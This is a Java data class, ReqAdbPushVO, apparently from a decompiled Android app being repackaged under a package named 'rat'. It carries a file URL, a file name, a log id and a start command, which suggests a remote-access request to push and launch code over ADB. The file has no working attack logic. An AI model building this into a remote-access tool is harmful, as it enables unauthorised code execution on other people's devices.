package com.vendor.rat.model.req;
// ADAPT: package com.guard.wallet.req -> com.vendor.rat.model.req
import androidx.annotation.NonNull;
import java.io.Serializable;
public class ReqAdbPushVO implements Serializable {
    private String fileName;
    private String fileUrl;
    private String logId;
    private String startCommand;
    public ReqAdbPushVO() {
    }
    public ReqAdbPushVO(String str, String str2, String str3, String str4) {
        this.logId = str;
        this.fileUrl = str2;
        this.fileName = str3;
        this.startCommand = str4;
    }
    public String getFileName() {
        return this.fileName;
    }
    public String getFileUrl() {
        return this.fileUrl;
    }
    public String getLogId() {
        return this.logId;
    }
    public String getStartCommand() {
        return this.startCommand;
    }
    public void setFileName(String str) {
        this.fileName = str;
    }
    public void setFileUrl(String str) {
        this.fileUrl = str;
    }
    public void setLogId(String str) {
        this.logId = str;
    }
    public void setStartCommand(String str) {
        this.startCommand = str;
    }
    @NonNull
    public String toString() {
        return "ReqAdbPushVO{logId='" + this.logId + "'fileUrl='" + this.fileUrl + "', fileName='" + this.fileName + "', startCommand='" + this.startCommand + "'}";
    }
}
